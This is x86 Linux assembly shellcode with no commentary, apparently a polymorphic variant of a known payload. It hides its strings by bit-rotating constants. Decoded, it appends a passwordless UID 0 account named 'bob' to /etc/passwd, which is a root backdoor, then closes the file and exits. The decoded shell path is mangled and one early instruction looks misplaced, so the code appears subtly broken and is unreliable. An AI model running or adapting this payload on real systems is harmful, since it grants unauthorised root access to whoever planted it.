section .text
	global _start

_start: 
	xor    eax,eax
	mov eax,ecx
	push   eax

	mov ebx, 0xC8EEE6E6
	ror ebx, 1
	mov dword [esp-4], ebx
	sub esp,4

	mov ebx, 0xC2E05EC6
	ror ebx, 1
	push ebx

	mov ebx, 0xE8CA5E5E
	ror ebx, 1
	push ebx

	mov    ebx,esp
	mov    cx,0x401
	mov    al,0x5
	int    0x80
	mov    ebx,eax
	xor    edx,edx

	mov ecx, 0xD0E65EDC
	ror ecx, 1
	push ecx

        mov ecx, 0xD0E65EDC
        ror ecx, 1
        push ecx

        mov ecx, 0x745E7474
        ror ecx, 1
        push ecx

        mov ecx, 0x60746074
        ror ecx, 1
        push ecx

        mov ecx, 0x74C4DEC4
        ror ecx, 1
        push ecx

	mov    ecx,esp
	mov    dl,0x14
	mov    al,0x4
	int    0x80
	mov    al,0x6
	int    0x80
	mov    al,0x1
	int    0x80
